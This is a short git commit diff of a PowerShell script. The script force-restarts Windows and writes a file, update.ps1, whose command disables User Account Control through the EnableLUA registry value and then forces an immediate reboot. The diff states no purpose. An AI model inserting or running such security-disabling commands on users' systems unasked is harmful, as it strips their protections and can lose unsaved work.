fafac27251f594a4d1f4b1170b7d0523fa497c2e
yousefbanhawy <96601475+yousefbanhawy@users.noreply.github.com>
2025-11-28 12:56:01 +0200

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -29,9 +29,9 @@ Start-Sleep -Seconds 3
 # 5. Force restart
 Shutdown /r /f /t 0
 
-echo "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
-Shutdown /r /f /t 0"
+echo "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0; Shutdown /r /f /t 0"
  > "C:\Users\joe\update.ps1"
+
 
 
 
